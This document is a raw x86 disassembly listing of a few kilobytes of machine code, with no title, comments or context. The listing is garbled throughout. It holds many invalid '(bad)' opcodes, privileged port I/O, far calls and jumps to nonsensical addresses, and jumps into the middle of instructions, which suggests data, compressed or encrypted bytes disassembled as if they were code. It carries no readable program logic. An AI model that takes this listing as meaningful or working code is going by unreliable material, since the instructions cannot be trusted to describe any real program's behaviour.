  4079d5:	pusha  
  4079d6:	outs   dx,DWORD PTR ds:[esi]
  4079d7:	pop    edi
  4079d8:	or     al,0x4d
  4079da:	out    dx,eax
  4079db:	sub    edi,DWORD PTR ds:0xe14c3e8b
  4079e1:	bound  ebp,QWORD PTR [esi-0x2d]
  4079e4:	mov    ch,0xf2
  4079e6:	stos   BYTE PTR es:[edi],al
  4079e7:	test   al,0xeb
  4079e9:	push   edx
  4079ea:	(bad)  
  4079eb:	cmp    esi,ebp
  4079ed:	fcomp  DWORD PTR [eax-0x42]
  4079f0:	outs   dx,DWORD PTR ds:[esi]
  4079f1:	inc    ebx
  4079f2:	(bad)  
  4079f3:	nop
  4079f4:	pop    edx
  4079f5:	xchg   edx,eax
  4079f6:	push   DWORD PTR [ebx+0x7f]
  4079f9:	fsub   DWORD PTR gs:[esi+0x40]
  4079fd:	out    0xd2,al
  4079ff:	bound  ebp,QWORD PTR [ebx-0x29]
  407a02:	(bad)  
  407a03:	stc    
  407a04:	xlat   BYTE PTR ds:[ebx]
  407a05:	dec    ebx
  407a06:	lock mov al,0xb9
  407a09:	jbe    0x407a5e
  407a0b:	sbb    BYTE PTR [ebp+0x4f],cl
  407a0e:	cmp    esp,DWORD PTR [eax+0x4f]
  407a11:	jb     0x4079fc
  407a13:	sbb    dh,BYTE PTR [ecx]
  407a15:	in     al,dx
  407a16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a17:	dec    edx
  407a18:	cmp    edx,DWORD PTR [eax-0x19]
  407a1b:	shr    ecx,1
  407a1d:	leave  
  407a1e:	addr16 jl 0x407a1f
  407a21:	int    0xb2
  407a23:	xchg   DWORD PTR [esi-0x4b67c3d1],ecx
  407a29:	xchg   ebx,eax
  407a2a:	popa   
  407a2b:	outs   dx,DWORD PTR ds:[esi]
  407a2c:	test   esp,ebp
  407a2e:	fild   QWORD PTR [ecx+esi*2]
  407a31:	ja     0x407aa2
  407a33:	inc    edx
  407a34:	add    ebx,DWORD PTR [eax]
  407a36:	sub    eax,0x7327644c
  407a3b:	enter  0x343f,0xc3
  407a3f:	lds    esi,FWORD PTR [edx]
  407a41:	shl    DWORD PTR [esi],cl
  407a43:	xor    DWORD PTR [eax+0x75c40eea],eax
  407a49:	pop    eax
  407a4a:	cli    
  407a4b:	sar    BYTE PTR [eax*2+0x7bf6293f],1
  407a52:	ret    0xc3d1
  407a55:	(bad)  
  407a57:	dec    ecx
  407a58:	mov    ds:0xe71fbe11,al
  407a5d:	arpl   WORD PTR [ebx-0x3d],dx
  407a60:	xor    eax,0x4b80c3b7
  407a65:	inc    ebp
  407a66:	mov    bl,0xbf
  407a68:	stc    
  407a69:	mov    bh,ch
  407a6b:	or     cl,0xb5
  407a6e:	lods   al,BYTE PTR ds:[esi]
  407a6f:	rol    DWORD PTR ds:0x548102f2,1
  407a75:	aaa    
  407a76:	arpl   WORD PTR [edx-0x40be0daf],si
  407a7c:	add    eax,DWORD PTR [edi]
  407a7e:	shl    DWORD PTR [ecx],1
  407a80:	dec    edx
  407a81:	jnp    0x407a52
  407a83:	mov    esi,0xf9e0ed12
  407a88:	mov    edx,0x78b62149
  407a8d:	aam    0xe9
  407a8f:	stos   DWORD PTR es:[edi],eax
  407a90:	mov    al,0x3b
  407a92:	mov    ds:0x9698605f,al
  407a97:	pusha  
  407a98:	dec    esi
  407a99:	test   BYTE PTR es:[eax-0x34018d1a],ch
  407aa0:	ficom  WORD PTR [ebx]
  407aa2:	into   
  407aa3:	adc    ebp,DWORD PTR ds:0xfe4afeaa
  407aa9:	pop    ds
  407aaa:	sub    eax,0xbb8bcbf0
  407aaf:	inc    ebp
  407ab0:	pop    DWORD PTR [ecx-0x6cfbc374]
  407ab6:	add    eax,0x33c3d771
  407abb:	pop    eax
  407abc:	aad    0x96
  407abe:	xchg   ecx,eax
  407abf:	fisub  DWORD PTR [eax*4-0x62508696]
  407ac6:	(bad)  
  407ac7:	lea    eax,[esi-0xe3c4c6b]
  407acd:	rol    cl,cl
  407acf:	cmp    al,0x2
  407ad1:	adc    al,ch
  407ad3:	or     ch,BYTE PTR [ebx-0x3c299c17]
  407ad9:	in     eax,0x95
  407adb:	fiadd  DWORD PTR [ecx+0x30a3dc91]
  407ae1:	aaa    
  407ae2:	jp     0x407b48
  407ae4:	push   ss
  407ae5:	sub    eax,0x2ab8d1c2
  407aea:	or     eax,0x9e39024e
  407aef:	adc    dh,bh
  407af1:	ss push cs
  407af3:	mov    ch,0x1
  407af5:	mov    ah,0xe6
  407af7:	je     0x407ae0
  407af9:	push   ebp
  407afa:	xor    DWORD PTR [esi-0x775ae50c],edi
  407b00:	test   eax,0x769a0079
  407b05:	shl    DWORD PTR ds:0x3830b9cd,0x9b
  407b0c:	hlt    
  407b0d:	mov    dh,BYTE PTR [edx]
  407b0f:	(bad)  
  407b11:	jbe    0x407b6d
  407b13:	sub    esp,0xfffffffd
  407b16:	jg     0x407ae7
  407b18:	sbb    DWORD PTR [edx+0x11350461],edi
  407b1e:	out    0x39,eax
  407b20:	loop   0x407b0c
  407b22:	pop    edi
  407b23:	lock fimul WORD PTR [edx]
  407b26:	(bad)  
  407b27:	ja     0x407ab2
  407b29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b2a:	enter  0x4088,0x47
  407b2e:	fiadd  WORD PTR [ebx]
  407b30:	cmp    esp,DWORD PTR [ebp-0x36]
  407b33:	ret    
  407b34:	xor    al,0x56
  407b36:	icebp  
  407b37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b38:	ss scas al,BYTE PTR es:[edi]
  407b3a:	push   ds
  407b3b:	jne    0x35fba1bd
  407b41:	hlt    
  407b42:	sbb    DWORD PTR [eax-0x38],esp
  407b45:	xchg   edx,eax
  407b46:	addr16 sub esi,edi
  407b49:	test   al,0x77
  407b4b:	push   0xffffffb5
  407b4d:	dec    esp
  407b4e:	inc    ebp
  407b4f:	fst    DWORD PTR [edx]
  407b51:	loope  0x407bba
  407b53:	inc    eax
  407b54:	and    DWORD PTR [eax-0x1e],edx
  407b57:	or     al,BYTE PTR [eax-0x41061da5]
  407b5d:	pop    edi
  407b5e:	int3   
  407b5f:	xchg   ebp,eax
  407b60:	sbb    bl,BYTE PTR [esi+0x1]
  407b63:	(bad)  
  407b64:	retf   0x3af3
  407b67:	test   al,0x5b
  407b69:	sar    BYTE PTR [edx+ecx*1],1
  407b6c:	inc    BYTE PTR [eax]
  407b6e:	xor    al,BYTE PTR [ebp+0x72]
  407b71:	sub    eax,0xbb30c59
  407b76:	mov    ds:0xfb2129c2,eax
  407b7b:	call   0x73cf6170
  407b80:	jno    0x407b8a
  407b82:	mov    ch,0xab
  407b84:	and    al,0xa9
  407b86:	adc    edi,DWORD PTR [ecx+esi*1-0x4cc9d233]
  407b8d:	push   esi
  407b8e:	mov    fs,WORD PTR [ebx+0x6a]
  407b91:	je     0x407b92
  407b93:	fstp   st(4)
  407b95:	sbb    BYTE PTR [esi],0xfb
  407b98:	cmp    BYTE PTR [ecx+0x38],bl
  407b9b:	out    dx,eax
  407b9c:	mov    eax,ds:0x6003cc14
  407ba1:	stc    
  407ba2:	fsubr  DWORD PTR [esi+ebx*4-0x563ae8e4]
  407ba9:	iret   
  407baa:	push   edx
  407bab:	cld    
  407bac:	scas   al,BYTE PTR es:[edi]
  407bad:	cmp    dl,bl
  407baf:	not    DWORD PTR [esp+edx*1+0x34903cf4]
  407bb6:	or     esp,eax
  407bb8:	push   ss
  407bb9:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  407bbb:	jne    0x407c36
  407bbd:	xchg   eax,esi
  407bbf:	mov    eax,0x82430e52
  407bc4:	mov    ah,0x4d
  407bc6:	out    0x8b,eax
  407bc8:	retf   
  407bc9:	pop    edi
  407bca:	pop    es
  407bcb:	neg    DWORD PTR [ebx+0x62]
  407bce:	sbb    ebx,esi
  407bd0:	jg     0x407b70
  407bd2:	pop    ebp
  407bd3:	inc    ecx
  407bd4:	xchg   esp,eax
  407bd5:	dec    ebx
  407bd6:	pop    edi
  407bd7:	xchg   esp,ebx
  407bd9:	sub    ah,BYTE PTR [esi-0x5e3b6aef]
  407bdf:	sbb    eax,0x14c96ab2
  407be4:	push   ss
  407be5:	out    dx,eax
  407be6:	mov    bh,0xe9
  407be8:	fist   DWORD PTR [ecx-0xecd251e]
  407bee:	ds std 
  407bf0:	loope  0x407b92
  407bf2:	sub    ecx,esp
  407bf4:	cmp    DWORD PTR es:[edx-0xb],esp
  407bf8:	sti    
  407bf9:	mov    dh,0x7d
  407bfb:	lahf   
  407bfc:	int    0xf8
  407bfe:	xchg   esp,eax
  407bff:	xchg   edi,eax
  407c00:	push   cs
  407c01:	sub    bl,dl
  407c03:	xchg   esi,eax
  407c04:	ret    0x1aaf
  407c07:	sbb    DWORD PTR [ecx+ebx*1+0x42c2df12],ecx
  407c0e:	fnsave [edx]
  407c10:	out    dx,al
  407c11:	mov    cl,0xea
  407c13:	push   es
  407c14:	rol    esi,0x82
  407c17:	push   cs
  407c18:	pusha  
  407c19:	adc    esi,edx
  407c1b:	mov    ah,0x99
  407c1d:	xor    BYTE PTR [edx],cl
  407c1f:	cmp    ah,bl
  407c21:	mov    cl,0x48
  407c23:	rcr    al,1
  407c25:	xchg   ebx,eax
  407c26:	repnz sub edi,edx
  407c29:	pop    edx
  407c2a:	sti    
  407c2b:	mov    bh,0x4a
  407c2d:	pop    edx
  407c2e:	pop    esi
  407c2f:	je     0x407be1
  407c31:	cmp    BYTE PTR [ecx],bh
  407c33:	mov    ds:0xb9588450,al
  407c38:	pop    ss
  407c39:	es xchg ecx,eax
  407c3b:	or     ch,BYTE PTR [edx-0x60]
  407c3e:	out    dx,al
  407c3f:	inc    esi
  407c40:	int3   
  407c41:	popf   
  407c42:	imul   DWORD PTR [ebx]
  407c44:	lea    eax,[esi+0x2d987e2c]
  407c4a:	xor    esi,DWORD PTR [edi+ebp*2-0x7af5b2dc]
  407c51:	sbb    eax,0xf22b0252
  407c56:	mov    eax,ds:0x6c5e2838
  407c5b:	gs sahf 
  407c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c5e:	sbb    eax,DWORD PTR ds:0x9df6341c
  407c64:	xor    al,0xe2
  407c66:	(bad)  [ecx-0x46958fec]
  407c6c:	pop    edx
  407c6d:	icebp  
  407c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c6f:	xor    ebp,DWORD PTR [ebp-0x3d]
  407c72:	dec    esi
  407c73:	xchg   esp,eax
  407c74:	gs stc 
  407c76:	lock fcom st(5)
  407c79:	push   esp
  407c7a:	push   cs
  407c7b:	push   esi
  407c7c:	test   eax,0x4e934fbb
  407c81:	adc    esi,ebx
  407c83:	sub    al,0xa4
  407c85:	inc    edx
  407c86:	sbb    BYTE PTR [ecx-0x6f],bl
  407c89:	jmp    0x407c55
  407c8b:	jo     0x407c4b
  407c8d:	cmp    ebp,ebx
  407c8f:	retf   0xa41b
  407c92:	mov    dl,0x7a
  407c94:	push   esp
  407c95:	scas   eax,DWORD PTR es:[edi]
  407c96:	test   DWORD PTR [ebx*1+0x476f625b],edx
  407c9d:	mov    ds:0xafe2955f,eax
  407ca2:	test   DWORD PTR [ecx+edi*4+0x399bb4ec],0xa244d653
  407cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cae:	mov    ebp,0x6ddab0d8
  407cb3:	sub    BYTE PTR [eax+0x1b],dh
  407cb6:	jge    0x407c52
  407cb8:	jne    0x407c6f
  407cba:	mov    ebp,0x4a0eefca
  407cbf:	(bad)  
  407cc1:	js     0x407cb0
  407cc3:	or     bh,al
  407cc5:	popa   
  407cc6:	sub    ebp,DWORD PTR [ecx]
  407cc8:	repnz jecxz 0x407c81
  407ccb:	mov    edi,0x4525705b
  407cd0:	leave  
  407cd1:	addr16 inc ebx
  407cd3:	inc    eax
  407cd4:	in     al,dx
  407cd5:	ins    BYTE PTR es:[edi],dx
  407cd6:	push   ebp
  407cd7:	dec    esi
  407cd8:	setno  BYTE PTR [ebx]
  407cdb:	push   edi
  407cdc:	sbb    BYTE PTR [ebx+0x36fd0d29],bh
  407ce2:	out    0x9a,eax
  407ce4:	sahf   
  407ce5:	popa   
  407ce6:	arpl   WORD PTR [ebx],ax
  407ce8:	les    ecx,FWORD PTR [eax+edx*2+0x5aa9f462]
  407cef:	rcl    DWORD PTR [edi-0x44],0x25
  407cf3:	xchg   BYTE PTR [ebx-0x4cf56a00],ch
  407cf9:	dec    edi
  407cfa:	(bad)  
  407cfb:	cli    
  407cfc:	push   edx
  407cfd:	pop    eax
  407cfe:	shl    ebp,1
  407d00:	(bad)  
  407d01:	call   FWORD PTR [ebp-0x32c1000c]
  407d07:	xor    DWORD PTR [ebp+ebp*8-0x4c],esp
  407d0b:	in     al,0x5b
  407d0d:	push   ecx
  407d0e:	lods   al,BYTE PTR ds:[esi]
  407d0f:	outs   dx,DWORD PTR ds:[esi]
  407d10:	ins    DWORD PTR es:[edi],dx
  407d11:	xchg   BYTE PTR [ebp-0x7a9125c9],dl
  407d17:	enter  0xe135,0x8b
  407d1b:	es sub ecx,ecx
  407d1e:	mov    ebp,0x3811a8d3
  407d23:	and    eax,0x8f06de5f
  407d28:	mov    ebx,cs
  407d2a:	add    bl,bl
  407d2c:	lods   eax,DWORD PTR ds:[esi]
  407d2d:	std    
  407d2e:	scas   eax,DWORD PTR es:[edi]
  407d2f:	push   es
  407d30:	mov    es,WORD PTR [ebp-0x4541a198]
  407d36:	stos   DWORD PTR es:[edi],eax
  407d37:	xchg   ebx,eax
  407d38:	into   
  407d39:	(bad)  
  407d3a:	lods   eax,DWORD PTR ds:[esi]
  407d3b:	push   ebx
  407d3c:	pop    esi
  407d3d:	lds    ebx,FWORD PTR [ebx-0x6b41223b]
  407d43:	xor    bl,BYTE PTR [ebx*1-0x31b354e1]
  407d4a:	lahf   
  407d4b:	jnp    0x407cea
  407d4d:	push   cs
  407d4e:	xchg   ecx,eax
  407d4f:	pushf  
  407d50:	mov    ecx,0xb7a01f05
  407d55:	or     bh,BYTE PTR [edx+0x3a011dfa]
  407d5b:	in     al,0x8
  407d5d:	mov    ecx,0x7c53e003
  407d62:	mov    bl,BYTE PTR [edi-0x240e76e4]
  407d68:	call   0x9f57:0x4cbbb791
  407d6f:	imul   edi,DWORD PTR [edx+0x8],0x4d928457
  407d76:	icebp  
  407d77:	addr16 xchg edx,eax
  407d79:	lahf   
  407d7a:	and    DWORD PTR [ebx+eax*8+0x6bd38aa6],edx
  407d81:	add    ebp,DWORD PTR [ecx+0x5578979a]
  407d87:	jle    0x407dab
  407d89:	push   edx
  407d8a:	mov    ebx,0xb743a4ce
  407d8f:	fdivr  QWORD PTR [ebp+0x72]
  407d92:	xchg   ebp,eax
  407d93:	or     ecx,DWORD PTR [edi+ecx*4-0x23]
  407d97:	pop    edx
  407d98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d99:	jle    0x407d91
  407d9b:	fidiv  DWORD PTR [edi-0x35844f39]
  407da1:	imul   edx,DWORD PTR [ecx+0x2e],0x2b1cf246
  407da8:	stos   BYTE PTR es:[edi],al
  407da9:	repz pop esp
  407dab:	popa   
  407dac:	(bad)
  407db0:	mov    WORD PTR [ebx-0x7],?
  407db3:	fmul   QWORD PTR [edi]
  407db5:	ds ins DWORD PTR es:[edi],dx
  407db7:	cmp    edi,esp
  407db9:	in     eax,0x94
  407dbb:	or     edx,DWORD PTR [ebx+0x7]
  407dbe:	xchg   esp,eax
  407dbf:	add    al,0xad
  407dc1:	xlat   BYTE PTR ds:[ebx]
  407dc2:	xor    edi,DWORD PTR [edx-0x57]
  407dc5:	xor    dl,bl
  407dc7:	mov    bh,0xdb
  407dc9:	outs   dx,BYTE PTR ds:[esi]
  407dca:	imul   ebx,DWORD PTR [edi+0x27e440be],0x7c2ee818
  407dd4:	jle    0x407df3
  407dd6:	arpl   WORD PTR [ecx-0x2c],bx
  407dd9:	sbb    ch,BYTE PTR [eax+ecx*4+0x72]
  407ddd:	mul    DWORD PTR [eax]
  407ddf:	mov    eax,ds:0x2015afbc
  407de4:	cmp    BYTE PTR [esi],ch
  407de6:	push   ds
  407de7:	gs in  eax,0x98
  407dea:	xchg   BYTE PTR [esp+edx*4+0x739557f3],ah
  407df1:	mov    eax,0xa724b5c
  407df6:	pop    es
  407df7:	pop    ebx
  407df8:	pop    eax
  407df9:	loope  0x407e24
  407dfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dfc:	fist   WORD PTR [edx]
  407dfe:	icebp  
  407dff:	lock neg DWORD PTR [edx]
  407e02:	and    BYTE PTR [esi-0x79676c71],dh
  407e08:	push   0xffffff90
  407e0a:	sbb    eax,0x5b52cba5
  407e0f:	push   esp
  407e10:	pusha  
  407e11:	mov    ch,0x47
  407e13:	stos   BYTE PTR es:[edi],al
  407e14:	dec    eax
  407e15:	dec    edi
  407e16:	dec    esp
  407e17:	push   ebx
  407e18:	enter  0x8248,0x51
  407e1c:	std    
  407e1d:	sbb    al,0x11
  407e1f:	dec    ecx
  407e20:	ds xchg edi,eax
  407e22:	inc    ecx
  407e23:	in     eax,0xa7
  407e25:	fld    TBYTE PTR [eax+0x34fa4b05]
  407e2b:	fcomp  st(5)
  407e2d:	test   eax,0x957938ac
  407e32:	cmp    eax,0x18f9ceaf
  407e37:	sub    edx,DWORD PTR [ecx]
  407e39:	adc    edi,DWORD PTR [edx+0x11]
  407e3c:	retf   0x4b7b
  407e3f:	test   al,0x5
  407e41:	push   cs
  407e42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e43:	pop    esi
  407e44:	xchg   ebp,eax
  407e45:	ins    DWORD PTR es:[edi],dx
  407e46:	addr16 xchg eax,eax
  407e49:	push   0x951f68a8
  407e4e:	cmp    edi,ebx
  407e50:	and    BYTE PTR [eax-0x219fd526],ah
  407e56:	inc    eax
  407e57:	pop    ss
  407e58:	std    
  407e59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e5a:	aas    
  407e5b:	pop    ebx
  407e5c:	jne    0x407e05
  407e5e:	jne    0x407e8b
  407e60:	mov    edx,0x150499a1
  407e65:	scas   eax,DWORD PTR es:[edi]
  407e66:	fdiv   QWORD PTR [ebp+0x545ad6a9]
  407e6c:	pop    esp
  407e6d:	cmp    eax,0x9b820402
  407e72:	push   eax
  407e73:	and    eax,DWORD PTR [edx-0x1e]
  407e76:	into   
  407e77:	ficom  WORD PTR [edi-0xf]
  407e7a:	ins    BYTE PTR es:[edi],dx
  407e7b:	lds    ebx,FWORD PTR [esi+0x62]
  407e7e:	ror    DWORD PTR [eax+ecx*4+0x383ce378],0x87
  407e86:	xchg   edi,eax
  407e87:	push   ds
  407e88:	jl     0x407ebe
  407e8a:	mov    ds:0x381b0014,eax
  407e8f:	into   
  407e90:	call   0xe358ab2a
  407e95:	pop    ecx
  407e96:	or     eax,0x16ef6276
  407e9b:	jmp    0x407e9f
  407e9d:	mov    al,0x37
  407e9f:	add    al,0x68
  407ea1:	adc    ebx,DWORD PTR [ebp-0x2e]
  407ea4:	push   ebx
  407ea5:	int3   
  407ea6:	add    al,0x7
  407ea8:	cmp    eax,0xe66de2f7
  407ead:	mov    DWORD PTR [ecx-0x3bac9e5e],esi
  407eb3:	and    DWORD PTR [edx],esi
  407eb5:	rep lods al,BYTE PTR ds:[esi]
  407eb7:	xchg   esi,eax
  407eb8:	jb     0x407e8e
  407eba:	ret    0xc178
  407ebd:	inc    esi
  407ebe:	and    DWORD PTR [esi+eiz*4],esp
  407ec1:	pop    edi
  407ec2:	jmp    0x4ac9c850
  407ec7:	add    BYTE PTR [edi],cl
  407ec9:	stos   DWORD PTR es:[edi],eax
  407eca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ecb:	out    0x8a,al
  407ecd:	sbb    DWORD PTR [ecx],edx
  407ecf:	or     al,0xd
  407ed1:	or     edi,DWORD PTR [eax+0x5a]
  407ed4:	shl    BYTE PTR [eax+0x58aef2e2],1
  407eda:	xor    cl,0x8f
  407edd:	lods   eax,DWORD PTR ds:[esi]
  407ede:	cs aas 
  407ee0:	or     eax,0xe69bc158
  407ee5:	cmp    cl,BYTE PTR [esi+0x12]
  407ee8:	mov    ds:0xf7127026,eax
  407eed:	adc    ecx,DWORD PTR [edi-0x15a3e967]
  407ef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ef4:	fs ja  0x407f2c
  407ef7:	lods   eax,DWORD PTR ds:[esi]
  407ef8:	ins    DWORD PTR es:[edi],dx
  407ef9:	cmp    eax,0x32361a62
  407efe:	xor    DWORD PTR [ebp-0x3fc97235],ebp
  407f04:	out    dx,al
  407f05:	inc    esp
  407f06:	call   0x1e76:0xb3218f3f
  407f0d:	mov    edx,0xa0022d48
  407f12:	imul   ecx,DWORD PTR [esi+0x2ecfe31c],0xc1f0c520
  407f1c:	cli    
  407f1d:	into   
  407f1e:	neg    DWORD PTR [edi+0x55]
  407f21:	sub    BYTE PTR [ebx+0x55799cf6],al
  407f27:	mov    ah,0xcf
  407f29:	jl     0x407f3c
  407f2b:	mov    dh,0x72
  407f2d:	inc    eax
  407f2e:	dec    edx
  407f30:	dec    ebp
  407f31:	scas   al,BYTE PTR es:[edi]
  407f32:	js     0x407ee5
  407f34:	je     0x407f23
  407f36:	in     eax,dx
  407f37:	out    dx,eax
  407f38:	call   FWORD PTR [ebx+0x6c]
  407f3b:	iret   
  407f3c:	mov    ebp,0x8718a87c
  407f41:	push   es
  407f42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f43:	mov    al,0x42
  407f45:	mov    bl,0xd3
  407f47:	(bad)  
  407f48:	jae    0x407f6d
  407f4a:	imul   esi,DWORD PTR [esi+0x57],0x125e4052
  407f51:	cdq    
  407f52:	xchg   DWORD PTR [esi+eiz*1-0x4c],eax
  407f56:	add    al,0xcd
  407f58:	mov    ebx,0x59cf2c39
  407f5d:	inc    edx
  407f5e:	mov    ebp,0x201e37c
  407f63:	cmp    edx,0x8a3721ae
  407f69:	adc    al,0x7c
  407f6b:	push   cs
  407f6c:	mov    al,bh
  407f6e:	ror    DWORD PTR [ebx],cl
  407f70:	add    eax,0xeb9aa7f6
  407f75:	loopne 0x407f56
  407f77:	in     al,0xa3
  407f79:	stos   BYTE PTR es:[edi],al
  407f7a:	adc    ah,BYTE PTR [edi+0xb]
  407f7d:	cdq    
  407f7e:	push   ebx
  407f7f:	(bad)  
  407f80:	icebp  
  407f81:	adc    al,0xb3
  407f83:	adc    al,0x2
  407f85:	stos   DWORD PTR es:[edi],eax
  407f86:	scas   al,BYTE PTR es:[edi]
  407f87:	mov    edi,0x46243f99
  407f8c:	pop    ds
  407f8d:	pop    es
  407f8e:	(bad)  
  407f8f:	cmp    dl,BYTE PTR [ecx-0x26e7b54a]
  407f95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f96:	pop    ecx
  407f97:	xor    BYTE PTR [ebx],cl
  407f99:	and    DWORD PTR [ecx-0x31],0x57
  407f9d:	loopne 0x407f65
  407f9f:	stos   BYTE PTR es:[edi],al
  407fa0:	xchg   esi,eax
  407fa1:	(bad)  [edx-0x79]
  407fa4:	int3   
  407fa5:	push   es
  407fa6:	sbb    eax,DWORD PTR [esp+ebp*2]
  407fa9:	imul   edi,DWORD PTR ds:[ebx-0x565aec80],0xf26282c8
  407fb4:	idiv   BYTE PTR [edi-0x5b]
  407fb7:	daa    
  407fb8:	push   esp
  407fb9:	add    ebx,DWORD PTR [edx]
  407fbb:	jno    0x408021
  407fbd:	stos   BYTE PTR es:[edi],al
  407fbe:	in     al,0xca
  407fc0:	call   0xaeef:0xe8da7de5
  407fc7:	sub    BYTE PTR [esi],bh
  407fc9:	mov    edi,0x71526c99
  407fce:	or     dh,BYTE PTR [edx+0x1d]
  407fd1:	daa    
  407fd2:	add    BYTE PTR [ecx-0x4e16b475],ah
  407fd8:	ror    BYTE PTR [ecx],1
  407fda:	inc    ecx
  407fdb:	nop
  407fdc:	lds    edi,FWORD PTR [edx-0x20]
  407fdf:	dec    ebx
  407fe0:	loope  0x407fca
  407fe2:	inc    esp
  407fe3:	mov    edx,0xf550ae01
  407fe8:	inc    edx
  407fe9:	pop    ebx
  407fea:	loope  0x407f84
  407fec:	outs   dx,BYTE PTR ds:[esi]
  407fed:	xor    BYTE PTR [edx+ebp*4-0x6d],dl
  407ff1:	sub    al,0xa1
  407ff3:	and    edi,DWORD PTR [eax+0x2a]
  407ff6:	outs   dx,DWORD PTR ds:[esi]
  407ff7:	shl    BYTE PTR [edx+0xb5f8de6],0x21
  407ffe:	mov    WORD PTR [edi+0x14],?
  408001:	imul   esp,esp,0x4d741813
  408007:	push   0xffffff89
  408009:	test   BYTE PTR [esi],dh
  40800b:	jmp    0x408002
  40800d:	test   BYTE PTR [esp+ebx*8],bh
  408010:	mov    al,ds:0xf389b5c0
  408015:	inc    edx
  408016:	scas   al,BYTE PTR es:[edi]
  408017:	push   ebx
  408018:	mov    al,0x1f
  40801a:	fwait
  40801b:	sbb    eax,0xf74f84ad
  408020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408021:	inc    ebp
  408022:	(bad)  
  408023:	ins    BYTE PTR es:[edi],dx
  408024:	inc    esp
  408025:	dec    edx
  408026:	mov    bl,cl
  408028:	pop    edx
  408029:	fdivr  QWORD PTR [esi]
  40802b:	cmp    eax,0x73229d38
  408030:	xchg   edx,eax
  408031:	adc    DWORD PTR [ecx-0x35],esi
  408034:	arpl   WORD PTR [esi+0x3203fcf5],di
  40803a:	jl     0x407fd5
  40803c:	test   al,0x44
  40803e:	add    cl,BYTE PTR [ebx+0x6404d852]
  408044:	test   al,0xd5
  408046:	test   BYTE PTR [esi+ecx*8-0x39],bl
  40804a:	mov    ds:0xf5149615,al
  40804f:	sub    bl,BYTE PTR [esi]
  408051:	dec    ecx
  408052:	and    eax,edi
  408054:	cmp    al,0x43
  408056:	add    al,0x6c
  408058:	mov    cl,0x84
  40805a:	push   ebx
  40805b:	aas    
  40805c:	vorps  ymm5,ymm6,YMMWORD PTR [ecx+ebx*2-0x3faffc99]
  408065:	jle    0x4080c6
  408067:	pop    esp
  408068:	cmp    DWORD PTR [ebx+0x49],edx
  40806b:	jbe    0x40801f
  40806d:	sub    BYTE PTR [edx+edx*8-0x4846670c],bl
  408074:	sbb    al,BYTE PTR [edi+0x73]
  408077:	sbb    edi,DWORD PTR [ebp+eax*1+0x1c]
  40807b:	mov    cl,0x56
  40807d:	fcomp  DWORD PTR [esi]
  40807f:	push   edi
  408080:	sub    DWORD PTR [edi-0x43274d41],ecx
  408086:	add    dl,BYTE PTR [bx+di-0x3]
  40808a:	jnp    0x4080ee
  40808c:	fisub  DWORD PTR [esi-0x59854cf8]
  408092:	scas   eax,DWORD PTR es:[edi]
  408093:	fucomi st,st(1)
  408095:	ja     0x4080b5
  408097:	push   ds
  408098:	push   ebx
  408099:	cmp    al,0x82
  40809b:	push   edi
  40809c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40809d:	sub    al,bh
  40809f:	or     al,0x1d
  4080a1:	push   ds
  4080a2:	or     eax,0x48c7d8e1
  4080a7:	mov    al,ds:0xe4faaf25
  4080ac:	sbb    BYTE PTR [edx+edx*2],cl
  4080af:	adc    edi,DWORD PTR [edi-0x5]
  4080b2:	fnstsw WORD PTR [edx]
  4080b4:	mov    gs,WORD PTR [edi-0x6d]
  4080b7:	ja     0x408085
  4080b9:	sti    
  4080ba:	loope  0x408081
  4080bc:	xchg   ebx,eax
  4080bd:	mov    eax,0x695e4a9e
  4080c2:	mov    dh,0xa9
  4080c4:	mov    ds:0xa6b1cda6,eax
  4080c9:	in     eax,dx
  4080ca:	cmp    al,0x9f
  4080cc:	inc    edx
  4080cd:	call   0xf4a2:0x63a9fa1c
  4080d4:	fsub   QWORD PTR [edx+0x15abcdbc]
  4080da:	xchg   esp,eax
  4080db:	xchg   esp,eax
  4080dc:	sbb    dh,BYTE PTR [ebx+0x57]
  4080df:	popa   
  4080e0:	jge    0x4080b4
  4080e2:	xchg   esi,eax
  4080e3:	xchg   DWORD PTR [ebp+0x72],ecx
  4080e6:	sysexit 
  4080e8:	test   ah,0xd5
  4080eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080ec:	sub    al,0x6b
  4080ee:	or     al,0x1b
  4080f0:	stos   BYTE PTR es:[edi],al
  4080f1:	in     al,0xfc
  4080f3:	lods   eax,DWORD PTR ds:[esi]
  4080f4:	cmp    ch,BYTE PTR [ebx+0x7c]
  4080f7:	fsub   QWORD PTR [edx-0x5f45789b]
  4080fd:	sti    
  4080fe:	call   0xc5a962c8
  408103:	es jno 0x408174
  408106:	les    eax,FWORD PTR [edi-0x54]
  408109:	and    eax,0x25fd194a
  40810e:	out    dx,al
  40810f:	pop    edi
  408110:	out    dx,al
  408111:	xor    eax,0x316e19ba
  408116:	out    0xa7,eax
  408118:	xor    ebx,DWORD PTR [ebp-0x3a]
  40811b:	sbb    ebp,DWORD PTR [edi+0x74]
  40811e:	dec    eax
  40811f:	fisubr WORD PTR [esi-0x6a2a576a]
  408125:	mov    ebp,0xc13439c5
  40812a:	div    BYTE PTR [edi]
  40812c:	lods   al,BYTE PTR ds:[esi]
  40812d:	sbb    al,0xf2
  40812f:	jnp    0x4080bb
  408131:	add    eax,0x7ee350ac
  408136:	xchg   edi,eax
  408137:	pop    edi
  408138:	jmp    0x2a32:0x8f2989c9
  40813f:	setnp  bh
  408142:	inc    ecx
  408143:	test   al,0xfc
  408145:	push   edi
  408146:	mov    ah,cl
